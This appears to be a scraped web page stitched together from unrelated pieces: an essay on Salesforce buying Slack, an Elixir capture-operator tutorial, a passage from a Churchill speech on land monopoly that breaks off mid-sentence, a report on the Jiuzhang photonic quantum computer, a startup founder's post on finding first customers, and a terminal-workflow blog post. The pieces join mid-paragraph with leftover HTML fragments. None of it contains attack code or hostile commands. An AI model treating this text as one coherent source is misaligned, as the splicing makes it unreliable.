Muhammed Abiodun / Unsplash"></a><figcaption>(Muhammed Abiodun / Unsplash)</figcaption></figure></div><p>Slack’s life as an underdog darling of Silicon Valley ended on November 2, 2016. That’s when the upstart communication startup <a href="https://www.theverge.com/2016/11/2/13497766/slack-microsoft-teams-new-york-times-ad">published an open letter to Microsoft in the </a><em><a href="https://www.theverge.com/2016/11/2/13497766/slack-microsoft-teams-new-york-times-ad">New York Times</a></em>, offering the tech giant an insincere “welcome” to the world of workplace chat software. The occasion was <a href="https://www.theverge.com/2016/10/25/13405200/microsoft-teams-slack-competitor-launch">Microsoft’s launch of Teams</a>, a Slack clone that would come bundled with the company’s popular Office 365 suite of products.</p><p>In its letter, Slack warned Microsoft that “Slack is here to stay,” adding: “we’re just getting started.” But the 4 million users it had at the time would increase to just 12 million four years later, while Microsoft — which added Teams to its 365 bundle without increasing the price — <a href="https://www.theverge.com/2020/10/27/21537286/microsoft-teams-115-million-daily-active-users-stats">took Teams from zero to 115 million users</a>. </p><p>That disparity helps to explain why <a href="https://www.nytimes.com/2020/12/01/technology/salesforce-slack-deal.html">Slack sold itself this week to Salesforce</a>. The deal, which values Slack at $27.7 billion on revenues of $833 million over the past year, has largely been greeted with cheers. (Ben Thompson <a href="https://stratechery.com/2020/salesforce-acquires-slack-salesforces-reasoning-salesforces-opportunity/">offers a typically excellent rundown of the opportunity here for both Salesforce and Slack</a>.)</p><p>But it also feels like the end of an era — one where workers gained new power to bring their own tools to the office, and decide for themselves how they wanted to get work done. Slack first succeeded with small teams who wanted to accelerate their work, and was often dragged into organizations by early adopters. But today, waves of consolidation are leaving people with fewer real choices.</p><p>The rise of smart phones in the early 2010s brought with it a new surge of workplace productivity tools that made mincemeat of everything that had come before them. Box and Dropbox brought easy file storage and sharing. Evernote introduced the idea of ubiquitous, cloud-synchronized note-taking. Sunrise created a more social calendar, while Mailbox and Acompli reimagined email for the mobile phone.</p><p>Slack tiptoed into the conversation in the middle of the decade, and almost immediately became the fastest-growing enterprise software tool of all time. In 2015, just 18 months after it launched, <a href="https://www.theverge.com/2015/6/24/8836087/slack-1-million-daily-users">Slack reported having more than 1 million daily users</a> —&nbsp;a figure then unheard-of in enterprise software.</p><p>It had a great backstory —&nbsp;a last-ditch pivot from a failed video game called Glitch —&nbsp;and, in Stewart Butterfield, one of the tech world’s most charming founders. It also had a bold pitch: it was going to “kill email” —&nbsp;or, at the very least, reduce your reliance on it. And it would do so by integrating hundreds of other services into real-time work chat, creating a kind of all-knowing command console for your organization.</p><p>The company embodied the belief, so common in Silicon Valley, that the best product would win in the end. “Building a product that allows for significant improvements in how people communicate requires a degree of thoughtfulness and craftsmanship that is not common in the development of enterprise software,” the company wrote in its open letter to Microsoft. “How far you go in helping companies truly transform to take advantage of this shift in working is even more important than the individual software features you are duplicating.”</p><p>And yet if there’s a lesson of the past four years, it’s that thoughtfulness and craftsmanship only got the company about 10 percent as far as Microsoft did by copy-pasting Slack’s basic design. In its open letter, Slack famously told Microsoft: “You’ve got to do this with love.” In 2020, looking at Slack’s size, the idea seems laughable. What’s love got to do with it?</p><p>The thing is, I <em>hate</em> that this was the outcome for Slack. I love good productivity tools, and was rooting for Slack to someday become as good as the company hyped it up to be. (And perhaps it still will: like most giants Salesforce has a mixed track record when it comes to the success of its acquisitions, but some seem to be thriving. When I asked about this on Twitter, people had <a href="https://twitter.com/caseynewton/status/1333891286185644032?s=21">a lot of good things to say about post-acquisition Heroku</a>.)</p><p>But Slack’s struggle to succeed as an independent company sadly mirrors that of many one-time innovators in enterprise productivity. Mailbox died and Acompli sold to Microsoft, where it became the mobile Outlook app. Evernote is a pale shadow of its former self. Of that early cohort, only Box and Dropbox became — and still remain —&nbsp;public companies.</p><p>Why is this the case? To get some insight, I called up Aaron Levie, Box’s affable CEO. In Levie’s telling —&nbsp;and he also wrote <a href="https://blog.box.com/salesforce-slack-and-future-work">a blog post about the Slack sale</a> — it all comes down to sales. The idea that workers would someday choose all their own tools was always a fantasy, he told me, in part because most workers don’t event want to think about their tools. In such a world, the winning app will almost always be one with a giant, er, salesforce behind it. </p><p>Microsoft had one. Slack didn’t. Enter Salesforce.</p><p>“The reality with the enterprise is that you can have the best product, but that’s not good enough,” Levie told me. “You need distribution. And what Salesforce has — they have the procurement officers, they have the finance people. They have all of the apparatus you need to interact with to sell software, and they have it for the top 100,000 corporations around the world.”</p><p>Levie is bullish on the acquisition, because it puts Slack and Salesforce on more even ground. </p><p>“The only advantage Microsoft has is distribution, and so now they’ve neutralized the advantage that Microsoft has had,” he said. “All of a sudden, they can actually fulfill the ultimate promise of the opportunity, because they have 10 times the amount of salespeople that can go distribute this thing into corporations around the world.”</p><p>Assuming Levie is right — and I wouldn’t bet against him — that means the medium-term future of work is increasingly a choice between three giants: Microsoft, Salesforce, and (in a distant third) Google. And with that, the golden age of worker choice in productivity tools seems to be coming to an end.</p><p>That’s not to say that the incumbents won’t always face new challengers. But I wonder whether the low ceiling that Slack turned out to have has implications for some of the other fast-growing productivity companies of the current moment. Should Slack’s sale diminish our expectations for Airtable, or Notion, or Coda? Don’t get me wrong — I’m confident their investors will all get their money back, and then some. But do they have a real future outside the arms of a monolith?</p><p>If not, then the productivity market will become as consolidated as any number of other spaces on the internet, from app stores to search engines to social networks. And as our government antitrust regulators begin to awaken after a long period of hibernation, I wonder if they’ll have anything to say about it.</p><h3>The Ratio</h3><p><em>Today in news that could affect public perception of the big tech companies</em></p><p>⬆️ <strong>Trending up</strong>: <strong><a href="https://techcrunch.com/2020/12/02/google-news-showcase-paywalled-stories/">Google</a></strong><a href="https://techcrunch.com/2020/12/02/google-news-showcase-paywalled-stories/">’s new paid deals with publishers mean that access to some paywalled content will now be available to readers for free</a>.

        <p>Seeing the ampersand for the first time in Elixir I wanted to dig deep into what it meant. The first <code>&amp;</code> effectively either gets a reference to the original function or starts an anonymous function. Any ampersand after the first that references the positional argument passed to it. You could use this to write very concise anonymous functions. </p><p>Here's a couple of examples:</p><pre><code>messages = ["One", "Two"]

no_capture_operator = fn msg -&gt;
  IO.inspect(msg, label: 'no_capture_operator')
  %{itemValue: msg}
end
# no_capture_operator: "One"
# no_capture_operator: "Two"

messages |&gt; Enum.map(no_capture_operator)

new_messages = messages |&gt; Enum.map(&amp;%{itemValue: &amp;1})

IO.inspect(new_messages)
# [%{itemValue: "One"}, %{itemValue: "Two"}]

new_messages = messages |&gt; Enum.map(fn msg -&gt;
  IO.inspect(msg)
  %{itemValue: msg}
end)
# "One"
# "Two"

IO.inspect(new_messages, label: "new_messages =")
# new_messages =: [%{itemValue: "One"}, %{itemValue: "Two"}]

message_func = fn msg -&gt;
  IO.inspect(msg)
  %{itemValue: msg}
end

messages |&gt; Enum.map(&amp;message_func.(&amp;1))
# "One"
# "Two"

# the enum tuples have zero-based indexes, hence the + 1
message_with_odd_even = &amp;%{itemValue: &amp;1, type: (if rem(&amp;2 + 1, 2) === 0, do: "even", else: "odd")}

msg_tuple = {"One", 0}

IO.inspect(message_with_odd_even.(elem(msg_tuple, 0), elem(msg_tuple, 1)))
# %{itemValue: "One", type: "odd"}

IO.inspect(message_with_odd_even.("One", 0))
# %{itemValue: "One", type: "odd"}

new_messages = messages |&gt; Enum.with_index |&gt; Enum.map(&amp;message_with_odd_even.(elem(&amp;1, 0), elem(&amp;1, 1)))

IO.inspect(new_messages, label: 'new_messages 2 =')
# new_messages 2 =: [%{itemValue: "One", type: "odd"}, %{itemValue: "Two", type: "even"}]

messages |&gt; Enum.each(&amp;IO.inspect(&amp;1, label: "label for " &lt;&gt; &amp;1))
# label for One: "One"
# label for Two: "Two"

      <p><a name="justice"></a>We
are often assured by sagacious persons that the civilisation of modern
States is largely based upon respect for the rights of private
property. If that be true, it is also true that such respect cannot be
secured, and ought not, indeed, to be expected, unless property is
associated in the minds of the great mass of the people with ideas of
justice and of reason.</p>
      <p><a name="harmony"></a>It is, therefore,
of the first importance to the country - to any country - that there
should be vigilant and persistent efforts to prevent abuses, to
distribute the public burdens fairly among all classes, and to
establish good laws governing the methods by which wealth may be
acquired. The best way to make private property secure and respected is
to bring the processes by which it is gained into harmony with the
general interests of the public. When and where property is associated
with the idea of reward for services rendered, with the idea of
recompense for high gifts and special aptitudes displayed or for
faithful labour done, then property will be honoured. When it is
associated with processes which are beneficial, or which at the worst
are not actually injurious to the commonwealth, then property will be
unmolested; but when it is associated with ideas of wrong and of
unfairness, with processes of restriction and monopoly, and other forms
of injury to the community, then I think that you will find that
property will be assailed and will be endangered.</p>
      <p><a name="socialism"></a>A
year ago I was fighting an election in Dundee. In the course of that
election I attempted to draw a fundamental distinction between the
principles of Liberalism and of Socialism, and I said "Socialism
attacks capital; Liberalism attacks monopoly." And it is from that
fundamental distinction that I come directly to the land proposals of
the present Budget.</p>
      <p><a name="mother"></a>It is quite
true that the land monopoly is not the only monopoly which exists, but
it is by far the greatest of monopolies; it is a perpetual monopoly,
and it is the mother of all other forms of monopoly. It is quite true
that unearned increments in land are not the only form of unearned or
undeserved profit which individuals are able to secure; but it is the
principal form of unearned increment, derived from processes, which are
not merely not beneficial, but which are positively detrimental to the
general public. Land, which is a necessity of human existence, which is
the original source of all wealth, which is strictly limited in extent,
which is fixed in geographical position - land, I say, differs from all
other forms of property in these primary and fundamental conditions.</p>
      <p><a name="opponents"></a>Nothing
is more amusing than to watch the efforts of our monopolist opponents
to prove that other forms of property and increment are exactly the
same and are similar in all respects to the unearned increment in land.
They talk to us of the increased profits of a doctor or a lawyer from
the growth of population in the towns in which they live. They talk to
us of the profits of a railway through a greater degree of wealth and
activity in the districts through which it runs. They tell us of the
profits which are derived from a rise in stocks and shares, and even of
those which are sometimes derived from the sale of pictures and works
of art, and they ask us - as if it were their only complaint - "Ought
not all these other forms to be taxed too?"</p>
      <p><a name="analogies"></a>But
see how misleading and false all these analogies are. The windfalls
which people with artistic gifts are able from time to time to derive
from the sale of a picture - from a Vandyke or a Holbein - may here and
there be very considerable. But pictures do not get in anybody's way.
They do not lay a toll on anybody's labour; they do not touch
enterprise and production at any point; they do not affect any of those
creative processes upon which the material well-being of millions
depends. And if a rise in stocks and shares confers profits on the
fortunate holders far beyond what they expected, or, indeed, deserved,
nevertheless, that profit has not been reaped by withholding from the
community the land which it needs, but, on the contrary, apart from
mere gambling, it has been reaped by supplying industry with the
capital without which it could not be carried on.</p>
      <p><a name="service"></a>If
the railway makes greater profits, it is usually because it carries
more goods and more passengers. If a doctor or a lawyer enjoys a better
practice, it is because the doctor attends more patients and more
exacting patients, and because the lawyer pleads more suits in the
courts and more important suits. At every stage the doctor or the
lawyer is giving service in return for his fees; and if the service is
too poor or the fees are too high, other doctors and other lawyers can
come freely into competition. There is constant service, there is
constant competition; there is no monopoly, there is no injury to the
public interest, there is no impediment to the general progress.</p>
      <p><a name="other"></a>Fancy
comparing these healthy processes with the enrichment which comes to
the landlord who happens to own a plot of land on the outskirts or at
the centre of one of our great cities, who watches the busy population
around him making the city larger, richer, more convenient, more famous
every day, and all the while sits still and does nothing! Roads are
made, streets are made, railway services are improved, electric light
turns night into day, electric trams glide swiftly to and fro, water is
brought from reservoirs a hundred miles off in the mountains - and all
the while the landlord sits still. Every one of those improvements is
effected by the labour and at the cost of other people. Many of the
most important are effected at the cost of the municipality and of the
ratepayers. To not one of those improvements does the land monopolist,
as a land monopolist, contribute, and yet by every one of them the
value of his land is sensibly enhanced.</p>
      <p><a name="contributes"></a>He
renders no service to the community, he contributes nothing to the
general welfare, he contributes nothing even to the process from which
his own enrichment is derived. If the land were occupied by shops or by
dwellings, the municipality at least would secure the rates upon them
in aid of the general fund; but the land may be unoccupied,
undeveloped, it may be what is called "ripening" - ripening at the
expense of the whole city, of the whole country - for the unearned
increment of its owner. Roads perhaps have to be diverted to avoid this
forbidden area. The merchant going to his office, the artisan going to
his work, have to make a detour or pay a tram fare to avoid it. The
citizens are losing their chance of developing the land, the city is
losing its rates, the State is losing its taxes which would have
accrued, if the natural development had taken place - and that share
has to be replaced at the expense of the other ratepayers and
taxpayers; and the nation as a whole is losing in the competition of
the world - the hard and growing competition in the world - both in
time and money. And all the while the land monopolist has only to sit
still and watch complacently his property multiplying in value,
sometimes manifold, without either effort or contribution on his part.
And that is justice!</p>
      <p><a name="agricultural"></a>But let
us follow the process a little farther. The population of the city
grows and grows still larger year by year, the congestion in the poorer
quarters becomes acute, rents and rates rise hand in hand, and
thousands of families are crowded into one-roomed tenements. There are
120,000 persons living in one-roomed tenements in Glasgow alone at the
present time. At last the land becomes ripe for sale - that means that
the price is too tempting to be resisted any longer - and then, and not
till then, it is sold by the yard or by the inch at ten times, or
twenty times, or even fifty times, its agricultural value, on which
alone hitherto it has been rated for the public service.</p>
      <p><a name="disservice"></a>The
greater the population around the land, the greater the injury which
they have sustained by its protracted denial, the more inconvenience
which has been caused to everybody, the more serious the loss in
economic strength and activity, the larger will be the profit of the
landlord when the sale is finally accomplished. In fact you may say
that the unearned increment on the land is on all-fours with the profit
gathered by one of those American speculators who engineer a corner in
corn, or meat, or cotton, or some other vital commodity, and that the
unearned increment in land is reaped by the land monopolist in exact

is monopoly which is the keynote; and where monopoly prevails, the
greater the injury to society, the greater the reward of the monopolist
will be. See how this evil process strikes at every form of industrial
activity. The municipality, wishing for broader streets, better houses,
more healthy, decent, scientifically planned towns, is made to pay, and
is made to pay in exact proportion, or to a very great extent in
proportion, as it has exerted itself in the past to make improvements.
The more it has improved the town, the more it has increased the land
value, and the more it will have to pay for any land it may wish to
acquire. The manufacturer purposing to start a new industry, proposing
to erect a great factory offering employment to thousands of hands, is
made to pay such a price for his land that the purchase-price hangs
round the neck of his whole business, hampering his competitive power
in every market, clogging him far more than any foreign tariff in his
export competition; and the land values strike down through the profits
of the manufacturer on to the wages of the workman. The railway company
wishing to build a new line finds that the price of land which
yesterday was only rated at its agricultural value has risen to a
prohibitive figure the moment it was known that the new line was
projected; and either the railway …</p></td></div></div>

<p>A new type of quantum computer has proven that it can reign supreme, too.</p>
<p>A photonic quantum computer, which harnesses particles of light, or photons, performed a calculation that’s impossible for a conventional computer, researchers in China report online December 3 in <em>Science</em>. That milestone, known as quantum supremacy, has been met only once before, in 2019 by Google’s quantum computer (<em>SN: 10/23/19</em>). Google’s computer, however, is based on superconducting materials, not photons.</p>
<p>“This is the first independent confirmation of Google’s claim that you really can achieve quantum supremacy,” says theoretical computer scientist Scott Aaronson of the University of Texas at Austin. “That’s exciting.”</p>
<p>Named Jiuzhang after an ancient Chinese mathematical text, the new quantum computer can perform a calculation in 200 seconds that would take more than half a billion years on the world’s fastest non-quantum, or classical, computer.</p>

<p>“My first impression was, ‘wow,’” says quantum physicist Fabio Sciarrino of Sapienza University of Rome.</p>
<p>Google’s device, called Sycamore, is based on tiny quantum bits made of superconducting materials, which conduct energy without resistance. In contrast, Jiuzhang consists of a complex array of optical devices that shuttle photons around. Those devices include light sources, hundreds of beam splitters, dozens of mirrors and 100 photon detectors.</p>
<figure><figcaption><span>The quantum computer Jiuzhang manipulates light via a complex arrangement of optical devices (shown).</span><span>Hansen Zhong</span></figcaption></figure>


<p>Employing a process called boson sampling, Jiuzhang generates a distribution of numbers that is exceedingly difficult for a classical computer to replicate. Here’s how it works: Photons are first sent into a network of channels. There, each photon encounters a series of beam splitters, each of which sends the photon down two paths simultaneously, in what’s called a quantum superposition. Paths also merge together, and the repeated splitting and merging causes the photons to interfere with one another according to quantum rules.</p>
<p>Finally, the number of photons in each of the network’s output channels is measured at the end. When repeated many times, this process produces a distribution of numbers based on how many photons were found in each output.</p>
<p>If operated with large numbers of photons and many channels, the quantum computer will produce a distribution of numbers that is too complex for a classical computer to calculate. In the new experiment, up to 76 photons traversed a network of 100 channels. For one of the world’s most powerful classical computers, the Chinese supercomputer Sunway TaihuLight, predicting the results that the quantum computer would get for anything beyond about 40 photons was intractable.</p>

<p>While Google was the first to break the quantum supremacy barrier, the milestone is “not a single-shot achievement,” says study coauthor and quantum physicist Chao-Yang Lu of the University of Science and Technology of China in Hefei. “It’s a continuous competition between constantly improved quantum hardware and constantly improved classical simulation.” After Google’s quantum supremacy claim, for example, IBM proposed a type of calculation that might allow a supercomputer to perform the task Google’s computer completed, at least theoretically.</p>

<p>And achieving quantum supremacy doesn’t necessarily indicate that the quantum computers are yet very useful, because the calculations are esoteric ones designed to be difficult for classical computers.</p>
<p>The result does boost the profile of photonic quantum computers, which haven’t always received as much attention as other technologies, says quantum physicist Christian Weedbrook, CEO of Xanadu, a Toronto-based company focused on building photonic quantum computers. &nbsp;“Historically, photonics has been the dark horse.”</p>
<p>One limitation of Jiuzhang, Weedbrook notes, is that it can perform only a single type of task, namely, boson sampling. In contrast, Google’s quantum computer could be programmed to execute a variety of algorithms. But other types of photonic quantum computers, including Xanadu’s, are programmable.</p>
<p>Demonstrating quantum supremacy with a different type of device reveals how rapidly quantum computing is progressing, Sciarrino says. “The fact that now the two different platforms are able to achieve this regime … shows that the whole field is advancing in a very mature way.”</p>

                    <p>It took around 3 weeks after launch for my UniFi controller hosting service, <a href="https://hostifi.net/" rel="noopener nofollow">https://hostifi.net</a> to get from 0–11 customers, and in this post I’ll be sharing what I did during that time to find those first customers.</p><p>When starting a new business, getting your first 10 customers is super hard. If you can do it though, it’s a huge milestone. It means that you’re much more likely to be able to get to 100.</p><p>If you have 10 customers, you’ve probably done at least something right. Your product or service has proven it has potential to create value, and you’ve found at least one method of customer acquisition that is working.</p><p>There are many reasons why it’s so hard to get to 10. When you’re at 0, you don’t have any testimonials or positive reviews. You have no brand reputation, and because of that it is really hard to earn trust.</p><p>If that wasn’t bad enough, you also more than likely don’t have any idea how to get customers. Any ideas you do have are unproven so far.</p><p>When you built your product or service, you thought that you knew exactly what your customer needed, but because you haven’t had any customers yet, you’ll probably realize later that the requirements will change based on feedback.</p><p>You might even find out that the type of customer you thought would need your product doesn’t need it at all, and your actual customer profile is completely different than what you were expecting. That's what happened to me!</p><h3 id="may-24-2018-june-16-2018">May 24, 2018 — June 16, 2018<br></h3><p>From 0–11 Customers</p><figure><img src="https://blog.rchase.com/content/images/2020/01/image-14.png"><figcaption>Timeline of HostiFi’s customer and lead acquisition from launch to 11 customers</figcaption></figure><p>Typically when you start a business, your first few customers are your friends or family. As you do good work, improve your product or service, and get some positive reviews, it becomes easier to work your way out to the friends of friends and casual acquaintance zone. Eventually customers start to come in from referrals, and then one day you’ve got customers coming to you who you have no relation to, thanks to your brand awareness efforts.</p><p>Unfortunately, this traditional model was not possible for HostiFi. The problem was, I didn’t know a single person who needed UniFi controller hosting! That made getting those initial customers even harder.</p><p>Luckily, I had read Tyler Tringas’s Micro-SaaS ebook which had lots of helpful ideas on getting started: <a href="https://tylertringas.com/chapter-5-getting-your-first-customers/" rel="noopener nofollow">https://tylertringas.com/chapter-5-getting-your-first-customers/</a></p><p>Between that, listening to Omer Kahn’s <a href="https://saasclub.io/saas-podcast" rel="noopener nofollow">SaaS Podcast</a>, reading about SaaS success stories on <a href="http://indiehackers.com/" rel="noopener nofollow">Indie Hackers</a>, and others, I had an idea of what I needed to do. I was going to start by finding places on the internet where my potential customers congregate and begin reaching out to them.</p><h2 id="launch">Launch</h2><figure><img src="https://blog.rchase.com/content/images/2020/01/image-15.png"></figure><p>This is what Google Analytics looked like for the web traffic during the time period which the first 11 customers signed up.</p><p>The traffic from the first spike was mainly driven by my Tweet about launching HostiFi:</p><figure><img src="https://blog.rchase.com/content/images/2020/01/image-16.png"></figure><h2 id="initial-marketing-attempts">Initial Marketing Attempts</h2><p>At first, I tried several ways of getting the word out about HostiFi. Most of them were complete failures.</p><h3 id="upwork">Upwork</h3><figure><img src="https://blog.rchase.com/content/images/2020/01/image-17.png"><figcaption>HostiFi’s Upwork Profile</figcaption></figure><p><strong>Didn't work<strong>. </strong></strong>On launch day (May 24), I created an Upwork profile for HostiFi. This didn’t bring in a single lead to date. It’s not a bad idea though, and might work if I put a bit more time into building the profile up with small Ubiquiti jobs to get a higher ranking within the site. The idea is to find customers who are looking to pay for someone to do what your product does, and then recommend your product to them. I think the reason I gave up quickly on this was because I was seeing a very low volume for Ubiquiti related job postings.</p><h2 id="linkedin">LinkedIn</h2><figure><img src="https://blog.rchase.com/content/images/2020/01/image-18.png"><figcaption>HostiFi’s first LinkedIn post</figcaption></figure><p><strong>Didn't work<strong>.</strong></strong> See where it says 15 impressions? That’s how many people might have looked at that post. Not on that day. That’s 15 impressions total for May through October. Using LinkedIn to find Ubiquiti users wasn’t going to work. Although LinkedIn has hashtags and groups where Ubiquiti users can be found, company pages can’t engage with other people’s posts. A company page also can’t “connect” with anyone. It’s a one way street where users can interact with a company, but a company can’t interact with users.</p><h3 id="reddit">Reddit</h3><figure><img src="https://blog.rchase.com/content/images/2020/01/image-19.png"><figcaption>r/Ubiquiti moderators remove HostiFi’s advertisement</figcaption></figure><p><strong>Didn't work<strong>. </strong></strong>This one still really, really bums me out. The Ubiquiti SubReddit has an incredible 22.4k subscribers, certainly one of the biggest congregation of Ubiquiti users on the internet. On May 25 (day after launch), I created an account for HostiFi and sheepishly asked “What do you guys think of <a href="https://hostifi.net/" rel="noopener nofollow">https://hostifi.net</a>?" Almost immediately my post was deleted and I was reprimanded by the mods. I argued that the content I posted wasn’t spammy and was useful to the community, but they weren’t buying it.</p><h3 id="forums">Forums</h3><figure><img src="https://blog.rchase.com/content/images/2020/01/image-20.png"><figcaption>HostiFi reaches out to users of a Ubiquiti forum via private messaging</figcaption></figure><p><strong>Sort of worked<strong>.</strong></strong> This one was a big disappointment. On launch day, and for the first week after launch, I reached out to dozens of Ubiquiti users in a forum. I was asking for their feedback on HostiFi. Only 6 people replied. None were interested.</p><p>I listed this as a "sort of worked", because although private messaging didn't work, making non-spammy posts on the forum by helping answer questions about UniFi for people proved to be a big success in driving traffic to the site and getting customers.</p><h3 id="twitter">Twitter</h3><figure><img src="https://blog.rchase.com/content/images/2020/01/image-21.png"></figure><p><strong><strong>Success!</strong></strong> I created a Twitter account for HostiFi pre-launch, on May 16, 2018. I spent that month following #Ubiquiti and #UniFi. I mainly retweeted, liked, and followed users who were posting there.</p><figure><img src="https://blog.rchase.com/content/images/2020/01/image-22.png"></figure><p>Above is a screenshot of HostiFi’s Twitter Analytics in May 2018.</p><figure><img src="https://blog.rchase.com/content/images/2020/01/image-23.png"></figure><p>And above is HostiFi’s Twitter Analytics for June. As you can see, there was a major improvement in followers, impressions, and profile visits, all which were helping drive traffic to the site early on.</p><p>Twitter was the first place that I felt I was getting some traction. Unlike LinkedIn, I was able to directly interact with other users. I could find my people using hashtags, and engage in discussions with them openly. And unlike Reddit and the Ubiquiti Forums, I wasn’t at risk of being shutdown by mods.</p><h2 id="closing-thoughts">Closing thoughts</h2><p>Most of the initial marketing attempts that I did were completely new to me. I’ve been working full-time in IT my entire career. I’ve never had much experience in sales, marketing, or building a brand.</p><p>It wasn’t that hard though. The concept is pretty simple. Ideally, if you’ve created a product, you’ve made it with a certain group of people in mind. Where can you find those people on the internet, or in person? Direct your efforts in those places where your ideal customers congregate.</p><p>After the first 10, it’s important to start developing more scalable marketing approaches. Some I have been trying out since then are creating content, YouTube videos, paid advertising on Google, Facebook, Twitter, and LinkedIn, and referral commissions — I’ve been sending out $15 Amazon gift cards each time one of my customers refers a friend who signs up.</p><ul><li>Do try lots of strategies</li><li>Don’t spam online communities</li><li>Do engage with relevant people one-on-one and get feedback</li><li>Do invest more time into what initially begins working</li><li>Do eventually move onto more scalable long-term strategies like content marketing, paid advertising, referral programs</li></ul>

          <p><em>My personal workflow for terminal-based coding, writing, research, and more!</em></p>

<p>Hello everyone!
It has been quite sometime since I last posted!
Suffice it to say, I have been immensely busy the past year but I am happy to say I am able to resurrect this blog! <img title=":tada:" alt=":tada:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png" height="20" width="20"></p>

<p>I have thoroughly grown into my own workflow for programming, research, and writing.
Today, I am happy to be able to share it with you!</p>

<p>If you prefer to watch a video describing most of this entire process, here is an overview of my workflow from one of my <a href="https://www.twitch.tv/thecedarprince">live streams</a>.
It does not go as in-depth as this document but should serve as a strong complement to this post. <img title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>

<p><a href="https://youtu.be/2SLZQQfMF8E"><img src="http://jacobzelko.com/assets/workflow_youtube_vid.jpg" alt=""></a></p>



<p>I use <a href="https://github.com/alacritty/alacritty">Alacritty</a> as my terminal, <a href="https://www.zsh.org/">zsh</a> and <a href="https://ohmyz.sh/">oh-my-zsh</a> as my shell and plugin manager respectively, <a href="https://github.com/tmux/tmux">tmux</a> as my multiplexer, <a href="https://github.com/Peltoche/lsd">lsd</a> as my list command with fun icons, <a href="https://github.com/belluzj/fantasque-sans">Fantasque Sans Mono</a> as my typeface font, <a href="https://github.com/neovim/neovim">neovim</a> for my editor, <a href="https://github.com/junegunn/fzf">fzf</a> paired with <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> for speedy and interactive file finding, <a href="https://github.com/sharkdp/bat">bat</a> an enhanced <code>cat</code> with a git diff gutter, <a href="https://github.com/jgm/pandoc">pandoc</a> for writing in markdown and LaTeX and outputting the piece to whatever file type I want, <a href="http://jacobzelko.com/setting-up-zotero/">Zotero</a> for managing my collection on scientific literature, <a href="https://github.com/ranger/ranger">ranger</a> as a terminal-based file explorer, and <a href="https://github.com/morhetz/gruvbox-contrib">gruvbox-dark</a> as my general color palette.</p>

<p>Here are gists to the relevant config files I use to modify my interface and user experience:</p>

<ul>
  <li>
<strong>neovim</strong>: <a href="https://gist.github.com/TheCedarPrince/7b9b51af4c146880f17c39407815b594">init.vim</a>
</li>
  <li>
<strong>Alacritty</strong>: <a href="https://gist.github.com/TheCedarPrince/7743091bd8743a7568b718f30bf707c2">.alacritty.yml</a>
</li>
  <li>
<strong>tmux</strong>: <a href="https://gist.github.com/TheCedarPrince/07f6f8f79b1451ec436ff8dee236ccdd">.tmux.conf</a>
</li>
  <li>
<strong>zsh</strong>: <a href="https://gist.github.com/TheCedarPrince/77afe2674803d965a0f5abd108337040">.zshrc</a>
</li>
</ul>

<p>Here is a picture of what that looks like altogether:</p>

<p><img src="http://jacobzelko.com/assets/workflow_layout.png" alt=""></p>

<h2 id="my-workflow-in-action-boom">My Workflow in Action <img title=":boom:" alt=":boom:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f4a5.png" height="20" width="20">
</h2>

<p>The following sections describe in broad strokes my workflow.
I mention some plugins that I use and are provided in my config files.
If you want to learn more about them, I encourage you to read through my config files or search for them.</p>

<h3 id="floating-terminals">Floating Terminals</h3>

<p><img src="http://jacobzelko.com/assets/float_term.gif" alt=""></p>

<p>Floating terminals are immensely powerful and I love them!
This enables me to quickly pull up a terminal and do some changes without having to split tmux panes or get out of vim.
Furthermore, what is awesome is that you can use it as a sort of <code>vim-slime</code> tool to send lines of code to the floating terminal.
This is a great feature as it uses your last used floating terminal for its target - therefore, if you switch between projects a lot, just switch your floating terminal accordingly.
No need to keep opening and closing REPL sessions and such!</p>

<h3 id="persistent-working-sessions-via-tmux">Persistent Working Sessions via tmux</h3>

<p><img src="http://jacobzelko.com/assets/tmux_restore.gif" alt=""></p>

<p>Though it is a little hard to see, I closed my terminal completely.
Oh no!
All my paneling and windows have disappeared! 
I’ll have to spend valuable time getting my workflow set back up… Or do I?</p>

<p>tmux can actually remember all these layouts with the plugins, <code>resurrect</code> and <code>continuum</code>. 
This is great for when your computer unexpectedly dies or crashes as everything is backed up at regular intervals you define!
Furthermore, pairing the (neo)vim plugin, <code>obsession</code>, allows tmux to also automatically recover vim layouts and sessions as well.
You will never have to worry about losing your terminal workflow again!</p>

<h3 id="mouse-mode">Mouse Mode</h3>

<p><img src="http://jacobzelko.com/assets/mouse_mode.gif" alt=""></p>

<p>tmux and (neo)vim also support mouse mode and interactivity!
I can quickly jump all over the place with my mouse or easily resize any opened pane.</p>

<h3 id="interactive-file-finding">Interactive File Finding</h3>

<p><img src="http://jacobzelko.com/assets/vim_fzf.gif" alt=""></p>

<p>I integrated the powerful file finding tool, <code>fzf</code>, with <code>ripgrep</code> to quickly find files I am looking to use. 
Then, in my (neo)vim configuration file, I merged these two together into one function that I can easily call while editing files in (neo)vim. 
find files I search for and pandoc to enable citations in pandoc, markdown, or TeX files.</p>

<h3 id="terminal-based-file-explorer">Terminal-Based File Explorer</h3>

<p><img src="http://jacobzelko.com/assets/ranger_mode.gif" alt=""></p>

<p>Furthermore, I also use the great tool, <code>ranger</code>, which allows me to have a terminal based file explorer.
It’s nice as it pops up in its own window and does not actually directly interfere with any of the background files being edited. 
It even has image preview capabilities!</p>

<h3 id="citation-engine--live-preview">Citation Engine &amp; Live Preview</h3>

<p><img src="http://jacobzelko.com/assets/citation_mode.gif" alt=""></p>

<p>As a researcher, this part gets me immensely excited!
While I am writing, I can actively insert citation keys into whatever I am working on via <code>vim-pandoc</code>.
With my config file, you will have to specify where your own .bib file exists.
Furthermore, <code>markdown-preview</code> allows me to preview my markdown in a web browser and <code>vim-latex-live-preview</code> allows me to view my current TeX files in a pdf viewer – works for subfiles too! 
This works for whenever I write TeX files or markdown files which makes writing a breeze!</p>

<p>If any of this section is confusing, I strongly encourage you to read my article on <a href="http://jacobzelko.com/personal-research-management/">Knowledge Management</a>.</p>



<p>These are parts of my workflow that I used to use.
They have been retired for a variety of reasons but all in an effort to improve my workflow.
I have kept these around in case anyone finds it useful!</p>

<h3 id="vim-slime-for-rapid-evaluation">Vim-Slime for Rapid Evaluation</h3>

<p><strong>Rationale for deprecation:</strong> I used to use <code>vim-slime</code> but deprecated it from my workflow because of the flexibility of floating terminals.
Not only could I use floating terminals to send code, I could also quickly flip through terminals in one button press.</p>

<p><img src="http://jacobzelko.com/assets/vim_slime.gif" alt=""></p>

